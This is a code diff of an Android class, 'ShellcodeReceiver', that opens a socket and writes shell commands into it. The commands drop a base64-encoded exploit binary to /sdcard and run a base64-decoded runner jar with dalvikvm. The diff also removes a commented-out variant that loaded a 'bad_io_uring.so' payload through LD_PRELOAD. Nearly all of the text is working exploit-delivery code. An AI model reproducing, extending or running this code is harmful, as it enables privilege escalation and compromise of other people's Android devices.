@@ -190,47 +190,22 @@ public class ShellcodeReceiver extends BroadcastReceiver {
 
             Log.d("Main Activity", "Connected to " + HOST + ":" + PORT);
 
-            // send a message
-            // out.println("sleep 1000");
+            String base64Exploit = Base64.getEncoder().encodeToString(ExploitPayload.getAllBytes());
+            String saveBinaryCommand = "echo " + base64Exploit + " | base64 -d > /sdcard/exploit";
+            out.println(saveBinaryCommand);
+            out.flush();
+
+            Log.d("Main Activity", "uploaded exploit binary");
 
             String base64Jar = Base64.getEncoder().encodeToString(RunnerPayload.getAllBytes());
-            String exploitCommand = "echo " + base64Jar +  " | base64 -d > /sdcard/runner.jar; dalvikvm -cp /sdcard/runner.jar xyz.cygnusx.runner.RunnerMain 2>&1";
+            String exploitCommand = "echo " + base64Jar +  " | base64 -d > /sdcard/runner.jar; cd /sdcard && dalvikvm -cp /sdcard/runner.jar xyz.cygnusx.runner.RunnerMain 2>&1";
             out.println(exploitCommand);
             out.flush();
 
             Log.d("Main Activity", "ran command dalvick command");
-
-            OutputStream rawOutput = socket.getOutputStream();
-            rawOutput.write(ExploitPayload.getAllBytes());
-            rawOutput.flush();
-
-            // read a response
-            // String response = in.readLine();
-            // Log.d(TAG, "Server response: " + response);
-
         } catch (Exception e) {
             Log.e("MainActivity", "Socket error", e);
         }
-
-        // String poc = "bad_io_uring.so";
-
-        // Log.i("MainActivity", "running exploit: " + poc);
-
-        // String dataDir = getContext().getApplicationInfo().dataDir;
-        // String outputFile = dataDir + "/" + poc;
-        // try {
-        //     Path dst = Paths.get(outputFile);
-
-        //     try (FileOutputStream fos = new FileOutputStream(dst.toFile())) {
-        //         fos.write(exploit_bytes());
-        //     }
-        //     dst.toFile().setExecutable(true);
-
-        //     runCommand("LD_LIBRARY_PATH=" + dataDir + " LD_PRELOAD=" + dst + " sleep 10");
-        //     // runCommand(dst.toString() + " 2>&1 | log -t exploit");
-        // } catch (IOException e) {
-        //     throw new RuntimeException(e);
-        // }
     }
 
     void runCommand(String command) {
